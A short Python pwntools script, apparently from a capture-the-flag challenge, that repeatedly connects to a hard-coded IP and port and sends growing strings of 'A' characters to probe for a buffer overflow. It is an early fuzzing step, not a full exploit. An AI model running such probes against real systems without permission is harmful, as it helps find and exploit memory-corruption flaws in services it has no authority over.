IP,PORT="83.136.249.246",54533

from pwn import *
from pwnlib.tubes.remote import remote

if __name__ == '__main__':


    for i in range(0, 100, 10):

        p = remote(IP,PORT)
        
        data = p.recvline()
        print(data)

        payload=str(i)+("A"*i)
        print(payload)
        p.sendline(payload)

        data = p.recvline()
        print(data)
